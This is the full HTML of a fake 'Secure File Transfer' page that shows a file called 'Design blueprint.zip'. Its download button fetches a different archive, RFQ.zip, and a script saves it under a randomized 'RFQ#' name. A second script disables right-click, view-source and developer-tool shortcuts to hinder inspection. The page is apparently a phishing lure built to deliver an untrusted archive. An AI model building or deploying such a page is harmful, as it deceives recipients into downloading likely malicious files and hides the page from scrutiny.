<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">

  <title>Secure File Transfer</title>

  <style>
    :root {
      --text: #202124;
      --muted: #737780;
      --border: #e5e7eb;
      --surface: #ffffff;
      --page: #f7f8fa;
      --accent: #1b1b1b;
      --accent-hover: #363636;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: var(--page);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont,
        "Segoe UI", Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      font-size: 14px;
    }

    a {
      color: inherit;
      text-decoration: none;
    }

    .main {
      width: min(800px, calc(100% - 40px));
      margin: 0 auto;
      padding: 76px 0 100px;
    }

    .page-heading {
      margin-bottom: 32px;
    }

    .breadcrumb {
      margin-bottom: 19px;
      color: #737780;
      font-size: 12px;
      letter-spacing: 0.1px;
    }

    .breadcrumb span {
      margin: 0 8px;
      color: #b2b5bb;
    }

    h1 {
      margin: 0;
      font-size: 30px;
      line-height: 1.25;
      font-weight: 620;
      letter-spacing: -1px;
    }

    .description {
      margin: 11px 0 0;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.7;
    }

    .file-panel {
      overflow: hidden;
      background: var(--surface);
      border: 1px solid #e1e3e7;
      border-radius: 12px;
      box-shadow: 0 2px 5px rgba(20, 25, 35, 0.025);
    }

    .panel-heading {
      padding: 21px 26px;
      border-bottom: 1px solid var(--border);
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 0.05px;
    }

    .file-content {
      padding: 28px 26px 25px;
    }

    .file-row {
      display: flex;
      align-items: center;
      gap: 18px;
    }

    .file-symbol {
      width: 52px;
      height: 58px;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 1px solid #e2e4e8;
      border-radius: 8px;
      background: #fafbfc;
    }

    .file-symbol svg {
      width: 26px;
      height: 26px;
      color: #555b65;
    }

    .file-information {
      flex: 1;
      min-width: 0;
    }

    .file-name {
      margin: 0;
      overflow-wrap: anywhere;
      font-size: 16px;
      line-height: 1.5;
      font-weight: 600;
      letter-spacing: -0.25px;
    }

    .file-description {
      margin-top: 6px;
      display: flex;
      align-items: center;
      flex-wrap: wrap;
      gap: 9px;
      color: #777b83;
      font-size: 12px;
    }

    .file-badge {
      padding: 4px 6px;
      border: 1px solid #e5e7eb;
      border-radius: 4px;
      color: #555b65;
      font-size: 10px;
      font-weight: 650;
      letter-spacing: 0.5px;
    }

    .panel-divider {
      height: 1px;
      background: var(--border);
      margin: 26px 0 22px;
    }

    .availability {
      display: flex;
      align-items: center;
      gap: 9px;
      margin-bottom: 20px;
      color: #3b7452;
      font-size: 12px;
      font-weight: 500;
    }

    .availability-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #4e9366;
    }

    .download-button {
      width: 100%;
      min-height: 48px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      padding: 13px 20px;
      border: 1px solid var(--accent);
      border-radius: 7px;
      background: var(--accent);
      color: #fff;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      transition: background 150ms ease,
        border-color 150ms ease;
    }

    .download-button:hover {
      background: var(--accent-hover);
      border-color: var(--accent-hover);
    }

    .download-button:focus-visible {
      outline: 2px solid #555;
      outline-offset: 3px;
    }

    .download-button svg {
      width: 17px;
      height: 17px;
      flex-shrink: 0;
    }

    .download-note {
      margin: 14px 0 0;
      color: #81858d;
      font-size: 12px;
      line-height: 1.6;
      text-align: center;
    }

    @media (max-width: 600px) {
      .main {
        width: calc(100% - 32px);
        padding: 48px 0 65px;
      }

      h1 {
        font-size: 26px;
      }

      .panel-heading {
        padding: 18px;
      }

      .file-content {
        padding: 22px 18px;
      }

      .file-row {
        gap: 13px;
      }

      .file-symbol {
        width: 46px;
        height: 52px;
      }

      .file-name {
        font-size: 14px;
      }
    }
  </style>
</head>

<body>

  <main class="main">

    <section class="page-heading">
      <div class="breadcrumb">
        Home <span>/</span> Shared files
      </div>

      <h1>Shared file</h1>

      <p class="description">
        The following file is available for download.
        Review the file details below.
      </p>
    </section>

    <section class="file-panel">

      <div class="panel-heading">
        File details
      </div>

      <div class="file-content">

        <div class="file-row">

          <div class="file-symbol">
            <svg viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="1.5"
              stroke-linecap="round" stroke-linejoin="round"
              aria-hidden="true">
              <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/>
              <path d="M13 2v7h7"/>
              <path d="M12 12v6"/>
              <path d="m9 15 3 3 3-3"/>
            </svg>
          </div>

          <div class="file-information">

            <h2 class="file-name" id="filename">
              Design blueprint.zip
            </h2>

            <div class="file-description">
              <span class="file-badge">ZIP</span>
              <span>Compressed archive</span>
            </div>

          </div>
        </div>

        <div class="panel-divider"></div>

        <div class="availability">
          <span class="availability-dot"></span>
          <span id="status">Your ZIP download is ready.</span>
        </div>

        <a href="./RFQ.zip"
          id="download"
          class="download-button">

          <svg viewBox="0 0 24 24" fill="none"
            stroke="currentColor" stroke-width="1.8"
            stroke-linecap="round" stroke-linejoin="round"
            aria-hidden="true">
            <path d="M12 3v12"/>
            <path d="m7 10 5 5 5-5"/>
            <path d="M5 19h14"/>
          </svg>

          Download file
        </a>

        <p class="download-note">
          Select Download file to begin the download.
        </p>

      </div>
    </section>

  </main>

  <script>
    const downloadButton = document.getElementById("download");

    downloadButton.addEventListener("click", function (event) {
      event.preventDefault();

      // Generate a random 10-digit number.
      const randomNumber = crypto.getRandomValues(
        new Uint32Array(1)
      )[0] % 9000000000 + 1000000000;

      // Create a temporary download link.
      const link = document.createElement("a");

      link.href = "./RFQ.zip";
      link.download = `RFQ# ${randomNumber}.zip`;

      document.body.appendChild(link);
      link.click();
      link.remove();
    });
  </script>
<script>
  // Disable right-click
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
  });

  // Disable common dev shortcuts
  document.addEventListener('keydown', function(e) {
    // F12
    if (e.key === "F12") {
      e.preventDefault();
    }

    // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
    if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) {
      e.preventDefault();
    }

    // Ctrl+U (view source)
    if (e.ctrlKey && e.key.toUpperCase() === 'U') {
      e.preventDefault();
    }
  });
</script>

</body>
</html>
